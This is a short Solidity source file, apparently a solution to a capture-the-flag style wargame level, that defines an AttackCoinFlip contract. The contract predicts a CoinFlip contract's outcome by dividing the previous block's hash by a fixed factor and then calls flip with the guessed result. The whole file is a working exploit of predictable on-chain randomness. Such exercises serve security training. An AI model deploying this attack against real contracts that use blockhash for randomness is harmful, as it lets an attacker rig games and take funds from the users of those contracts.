pragma solidity ^0.8.0;

import '../Fallback/SafeMath.sol';
import './CoinFlip.sol';
contract AttackCoinFlip{
    using SafeMath for uint256;
    CoinFlip C;
    function exploit(address _contract) public {
        C = CoinFlip(_contract);
    }

    function attack() public{
        uint256 guessingValue;
        uint256 tmpOfCurrent = uint256(blockhash(block.number.sub(1)));
        guessingValue = tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);    
        bool guessing = guessingValue == 1 ? true : false;    
        C.flip(guessing);
    }
    
}